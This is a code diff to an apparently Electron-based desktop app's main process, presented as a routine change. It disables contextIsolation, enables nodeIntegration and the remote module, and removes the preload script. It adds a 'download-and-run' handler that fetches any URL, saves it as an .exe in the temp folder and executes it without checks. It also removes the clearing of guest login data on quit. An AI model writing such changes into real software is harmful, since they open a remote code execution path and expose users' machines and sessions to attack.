@@ -19,13 +19,13 @@ let mainWindow;
 
 function createWindow() {
   mainWindow = new BrowserWindow({
-    width: 1000,
-    height: 700,
+    width: 1200,
+    height: 800,
     frame: false,
     webPreferences: {
-      contextIsolation: true,
-      nodeIntegration: false,
-      preload: path.join(__dirname, 'preload.js')
+      nodeIntegration: true,
+      contextIsolation: false,
+      enableRemoteModule: true
     },
   });
 
@@ -43,6 +43,31 @@ function createWindow() {
 
   ipcMain.handle('close-window', () => {
     mainWindow.close();
+  });
+
+  // Handle download and run
+  ipcMain.handle('download-and-run', async (event, { name, url }) => {
+    try {
+      const response = await axios({
+        url,
+        method: 'GET',
+        responseType: 'arraybuffer'
+      });
+
+      const downloadPath = path.join(os.tmpdir(), `${name}.exe`);
+      fs.writeFileSync(downloadPath, response.data);
+      
+      exec(downloadPath, (error) => {
+        if (error) {
+          console.error(`Error running ${name}: ${error}`);
+        }
+      });
+
+      return `Successfully downloaded and launched ${name}`;
+    } catch (error) {
+      console.error(`Error downloading ${name}: ${error}`);
+      throw error;
+    }
   });
 
   // Check for updates immediately
@@ -92,20 +117,6 @@ ipcMain.handle('run-function', async (event, { name, args }) => {
   } else {
     throw new Error(`Function ${name} not found`);
   }
-});
-
-// Handle settings
-ipcMain.handle('get-settings', () => {
-  return store.get('settings');
-});
-
-ipcMain.handle('save-settings', (event, settings) => {
-  store.set('settings', settings);
-});
-
-// Clear login data on app quit
-app.on('before-quit', () => {
-  store.delete('guestSession');
 });
 
 app.whenReady().then(createWindow);
